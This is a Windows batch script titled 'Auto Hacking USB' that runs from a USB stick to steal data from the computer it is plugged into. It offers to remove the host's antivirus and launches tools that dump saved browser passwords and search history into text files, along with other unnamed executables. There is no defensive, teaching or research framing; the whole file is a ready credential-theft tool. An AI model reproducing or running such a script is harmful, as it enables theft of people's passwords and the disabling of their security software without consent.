@echo off
title Auto Hacking USB ~~ Legal Purposes ;)
:begin
echo Make sure you read the readme before procceeding to make sure everything works.
pause
echo Would you like to reset the data files before initliazing? (Y or N)
set /p reset=
if %reset% == "Y" goto :DoReset
if %reset% == "y" goto :DoReset
if %reset% == "N" goto :Anti-REM
if %reset% == "n" goto :Anti-REM
:DoReset
cls
echo Deleting data files...
ping localhost -n 2 >nul
del daten.txt
del history.txt
del passwords.txt
del searches.txt
del wireless_keys.txt
cls
goto :Anti-REM
:Anti-REM
echo Would you like to attempt to remove the Anti-Virus? (Y or N)
set /p Anti-REM=
if %Anti-REM% == "Y" goto :l33t
if %Anti-REM% == "y" goto :l33t
if %Anti-REM% == "N" goto :nl33t
if %Anti-REM% == "n" goto :nl33t
:nl33t
ping localhost -n 5 >nul
start tspion.exe
start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
start .\App\CommandLine\Process.exe
pause
start .\App\options.bat
goto eof
:l33t
start .\App\AV_REM
ping localhost -n 5 >nul
start tspion.exe
start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
start .\App\CommandLine\Process.exe
start .\App\Core.exe
pause
start .\App\options.bat
goto eof
